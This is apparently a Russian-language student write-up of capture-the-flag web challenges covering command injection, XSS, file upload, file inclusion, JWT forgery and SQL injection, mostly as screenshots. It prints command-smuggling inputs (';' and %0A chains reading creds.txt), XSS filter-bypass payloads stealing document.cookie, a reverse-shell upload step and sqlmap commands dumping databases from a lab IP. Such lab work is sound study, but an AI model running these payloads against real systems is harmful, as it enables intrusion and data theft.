Задание CE: уровень 0


перехватываем запрос через Burp Suit, уязвимость Command Execution позволяет выполнять команды через поле ввода.
![image](https://github.com/user-attachments/assets/32f708a3-3ace-4ce1-937f-488f765ebc2c)


Командой ls -a (в URL кодировке пробел заменяется знаком +) ls+-a выводим содержимое директории, в том числе скрытые файлы. Видим директорию interesting, заходим в нее командой cd+interesting. Для выполнения команд последовательно, одним запросом используем ; . Выводим ее содержимое ls+-a. Видим файл creds.txt, выводим его командой cat+creds.txt
![image](https://github.com/user-attachments/assets/751c2241-b4b1-4920-a1da-f6ab80363c19)



Задание XSS: уровень 0


![image](https://github.com/user-attachments/assets/b36c8816-b801-4863-82db-aa8e5940411e)
В поле Cookie видим параметр secret, его значение закодировано в формате Base64, его можно раскодировать выделив его в Burp Suite или через команду показанную ниже.

![image](https://github.com/user-attachments/assets/8197605c-2165-4646-a0d8-27c1865e0d14)









Задание FU: уровень 0

![image](https://github.com/user-attachments/assets/304952ad-43a5-4ff8-83f7-3b82c8a6248d)


Видим сайт, на который доступна загрузка файла. Загрузим reverse shell. Ограничений на расширение файла нет, поэтому используем .php.
![image](https://github.com/user-attachments/assets/87f3e36c-5994-4ce0-81c3-b427f223a4ae)


![image](https://github.com/user-attachments/assets/874509f7-f323-4f30-86e3-c6f90584ec54)
Через него получаем удаленный доступ. Выведем содержимое текущей директории ls+-a. Ничего интересного. Пробуем подняться выше командой cd+.. и выводим содержимое. Видим файл some.txt, командой cat выводим его.

![image](https://github.com/user-attachments/assets/c653cfc3-2808-4542-9d8b-72afbdaf41c0)










Command Execution: уровень 1

![image](https://github.com/user-attachments/assets/b7ebee0b-3b24-41de-aa81-83540012771a)

Замети папку .hidden, которая пригодится нам дальше. В целом задание аналогичное, только у нас 2 переменных. Выводим содержимое ls+-a, заходим в директорию comex1, там находим файл log1.txt, выводим. 

![image](https://github.com/user-attachments/assets/cfa68234-318c-41f3-8fb6-f60d2c0faaa2)

Замечаем необычную строку, декодировав ее получаем флаг
![image](https://github.com/user-attachments/assets/4f956069-8a47-4900-8962-71ba8103f02d)



Command Execution: уровень 2

Присутствует некоторая обработка ввода, которую можно обойти, например, закодировав \n %0A

![image](https://github.com/user-attachments/assets/4f2182ee-3b58-4be8-8407-d5c353a10680)


![image](https://github.com/user-attachments/assets/ea996ee5-fe19-47d3-82ae-be4f20bbfb8d)




![image](https://github.com/user-attachments/assets/75ee9eb2-423a-4a37-ab62-975791109093)

![image](https://github.com/user-attachments/assets/7efa1922-9ed9-419b-a7de-fce6a679acb8)




Command Execution: уровень 3

![image](https://github.com/user-attachments/assets/6e7ff00c-b425-47ec-b141-198de6fc58cb)

![image](https://github.com/user-attachments/assets/7cab80e3-b248-480f-8526-bac6d03bc214)


![image](https://github.com/user-attachments/assets/8f16baf0-3d20-410a-b8d8-a6f47bde1f54)


Command Execution: уровень 4


![image](https://github.com/user-attachments/assets/a797218f-b1dd-4fc3-9d02-2c743f720e34)

![image](https://github.com/user-attachments/assets/493e9da4-b2b0-49f7-a5dd-a0cc15250ba7)





 XSS: уровень 1

 ![image](https://github.com/user-attachments/assets/a200b3e2-622a-4419-8f5b-cb6420feaa74)

 <script>alert(document.cookie)</script>
![image](https://github.com/user-attachments/assets/62e43c79-285c-48cc-941f-9b8698606d7d)



 XSS: уровень 2

 
Вводим <body onload=alert(document.cookie)> обходя фильтр скрипт

 ![image](https://github.com/user-attachments/assets/14402f74-d56c-4beb-a4fe-097906b96645)
 
Декодируем куки important_person

![image](https://github.com/user-attachments/assets/8d07cb68-9225-41d2-88f3-4d6e0c68bc02)



  XSS: уровень 3

Вводим <SvG/oNloAd=alert(some_important_info.txt)>, обходя защиту от xss

![image](https://github.com/user-attachments/assets/9c05f94f-ec0c-4ca0-8581-892fb8a2a8c6)





 ![image](https://github.com/user-attachments/assets/b4bddabe-5e73-41a6-920c-91eb1c49f105)

{"alg":"HS256","typ":"JWT"}



'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>

<img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'">

<SvG/oNloAd=alert(/w4piesy3nm/)>


<SvG/oNloAd=alert(some_important_info.txt)>

![image](https://github.com/user-attachments/assets/3092edf7-eacf-44ef-9b63-c685cb6f04ae)


![image](https://github.com/user-attachments/assets/1db9e6f9-d01e-483d-92a3-c297622c1ce9)


![image](https://github.com/user-attachments/assets/6def24d6-e4ef-431c-9ea4-770bf8c84be5)

![image](https://github.com/user-attachments/assets/8899d99c-af68-4706-9606-d505730989e4)

Меняем поля на user и group, тем самым легко подделывая jwt токен, это возможно за счет отсутствия секретной строки, это можно проверить, введя случайные значения в это поле на сайте и если подпись все еще верифицирована, то этого слова нет.(подсказка)

Подставляем новый токен и входим с куки админа


![image](https://github.com/user-attachments/assets/a9f8020a-6fd6-4069-89a4-71a248193b3c)



  XSS: уровень 4

  
  ![image](https://github.com/user-attachments/assets/53ae8c91-d57b-469e-a8db-58823efef263)
  
Теперь записываем amazing_key в поле ключа

![image](https://github.com/user-attachments/assets/b975d289-b902-4242-a5c9-838c07e6d4a2)


![image](https://github.com/user-attachments/assets/813d410c-f4ba-4b5b-86bb-eb846e0188a7)


![image](https://github.com/user-attachments/assets/5ed73545-dc70-487e-8294-ae52728ba45e)




  XSS: уровень 5



![image](https://github.com/user-attachments/assets/6675cbbd-f3c1-4f7d-b9c5-dae023f7bef2)


![image](https://github.com/user-attachments/assets/7b2b468b-98ce-4bb8-866e-5c702bf2ea17)


![image](https://github.com/user-attachments/assets/c5f541b4-80b8-40da-a2b2-9086df88a8d9)


File Inclusion: уровень 1

![image](https://github.com/user-attachments/assets/a06f1a4d-ad4a-46af-9102-9b81671add90)

Дальше, применяя различные утилиты для поиска директорий  и файлов, например dirb, Ffuf, DirBuster начинаем искать. Я использовал DirBuster, тк он быстрее обрабатывал большие словами, которыми я пользовался сначала. Но, в этом задании, лучше составить свой словарь.

![image](https://github.com/user-attachments/assets/ba4d1474-f18e-4f04-bd5e-f8b59ea56199)


File Inclusion: уровень 2

![image](https://github.com/user-attachments/assets/b6e3b87d-2443-4c8e-b379-21ef0a089335)



![image](https://github.com/user-attachments/assets/141c0458-fa18-46cd-b1ea-89da7be6ae13)


![image](https://github.com/user-attachments/assets/cbe58cb1-8a85-401d-bacb-079394f3a488)





File Inclusion: уровень 3

![image](https://github.com/user-attachments/assets/93c358d5-c2eb-4e04-9464-872663714c45)

![image](https://github.com/user-attachments/assets/15697450-b352-452c-bab2-ef50d7decd20)


![image](https://github.com/user-attachments/assets/9ae24d63-7ca9-4ee4-81cb-f729427a1f77)


![image](https://github.com/user-attachments/assets/2e78e121-203d-410b-b037-7f1ca77ef689)




![image](https://github.com/user-attachments/assets/f87d0dff-8c4c-4cd3-9178-709a0c905e51)




File Inclusion: уровень 4




![image](https://github.com/user-attachments/assets/03f4b645-8fdd-4de7-9d9d-d8334b88638d)

![image](https://github.com/user-attachments/assets/261345c3-4199-4cd4-9614-23e40fc47571)

![image](https://github.com/user-attachments/assets/84f369cd-0716-460e-8df9-5da08c378538)




SQLI: уровень 1


![image](https://github.com/user-attachments/assets/a15f2e67-5735-4dda-8718-ece037314b2e)


SQLI: уровень 2


![image](https://github.com/user-attachments/assets/f0e0ccce-1b74-4cab-a7b9-fb7f885fd2c3)


![image](https://github.com/user-attachments/assets/4c091ee1-489d-443b-9e66-415383d06c8f)



SQLI: уровень 3

![image](https://github.com/user-attachments/assets/4eace13f-115a-4529-8acd-684d45f31cec)


![image](https://github.com/user-attachments/assets/b203ea74-25a2-49d7-9889-7ec1e867b18b)


sqlmap -u http://51.250.91.149/SQL/sql3.php --dbs

![image](https://github.com/user-attachments/assets/347659ad-5d79-4c00-bf57-30f3e03fadf1)



![image](https://github.com/user-attachments/assets/093044e3-7c91-4447-b007-b9942b0bf45b)




sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c --tables


![image](https://github.com/user-attachments/assets/4faf5bdc-09d0-4fd1-9db2-749d4a504c48)


sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c -T books --dump


![image](https://github.com/user-attachments/assets/5d4d88ee-00c7-4045-a388-850698255d66)


sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c -T flags --dump


![image](https://github.com/user-attachments/assets/8180c4ee-900c-460a-b829-0d5bc183ed71)


sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c -T secret --dump

![image](https://github.com/user-attachments/assets/676719fb-9a17-4980-b42a-258ea3b86054)

sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c -T users --dump

![image](https://github.com/user-attachments/assets/2a516c25-650d-4aae-999d-78dddf89b35d)

sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D course --tables

![image](https://github.com/user-attachments/assets/809a92a5-3ca8-46b6-9ce7-34c6000a6865)




sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D course --dump-all


![image](https://github.com/user-attachments/assets/38c3b949-3833-4d99-a849-87535d7d3699)


STUD{SQl_R00L3S!}  ???? флаг не принимается :(


sqlmap -u http://51.250.91.149/SQL/sql3.php --data="number=1&submit=%D0%9D%D1%83%2C+%D0%B2%D0%B2%D0%B5%D0%BB" -D 1ccb8097d0e9ce9f154608be60224c7c --dump-all


![image](https://github.com/user-attachments/assets/defedc77-b27b-4920-acc2-8e8739743bcb)






FU: уровень 1


![image](https://github.com/user-attachments/assets/253e3420-6e53-4047-9303-66acb01e7e7a)




![image](https://github.com/user-attachments/assets/fe4c68db-c81a-45c0-99c1-160fa31971d9)




FU: уровень 2



![image](https://github.com/user-attachments/assets/bf8f5313-0073-41e6-bcfb-61fa09841872)


![image](https://github.com/user-attachments/assets/b396ad8f-ab48-4f32-a5d7-968110a49fa6)





